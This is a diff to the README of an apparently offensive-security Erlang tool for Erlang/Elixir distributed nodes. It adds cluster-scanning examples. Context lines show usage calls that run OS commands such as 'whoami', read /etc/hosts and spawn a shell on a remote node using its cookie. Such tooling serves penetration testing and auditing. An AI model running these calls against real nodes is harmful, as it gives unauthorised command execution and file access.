@@ -47,10 +47,34 @@ rebar3 shell
 % Vulnerability scanning
 {ok, Findings} = jeger_scan:scan_node("192.168.1.5", "myapp", secret).
 
+% Cluster scanning (multiple nodes)
+{ok, Results} = jeger_cluster:scan_cluster("127.0.0.1", ["node1", "node2", "node3"], my_cookie).
+
 % Exploitation
 {ok, Result} = jeger_exploit:execute_command("192.168.1.5", "myapp", secret, "os:cmd(\"whoami\")").
 {ok, Content} = jeger_exploit:read_file("192.168.1.5", "myapp", secret, "/etc/hosts").
 {ok, Pid} = jeger_exploit:spawn_shell("192.168.1.5", "myapp", secret).
+```
+
+### Cluster Scanning Example
+
+Scan multiple nodes in a clustered application:
+
+```erlang
+% Scan all nodes in a Phoenix/Elixir cluster
+{ok, Results} = jeger_cluster:scan_cluster(
+    "127.0.0.1",
+    ["node1", "node2", "node3"],
+    my_cookie,
+    #{verbose => true}
+).
+
+% View formatted results
+io:format("~s", [jeger_cluster:format_cluster_scan(Results)]).
+
+% Extract specific findings
+#{results := NodeResults} = Results,
+[#{vulnerabilities := #{findings := Findings}} | _] = NodeResults.
 ```
 
 ## Testing
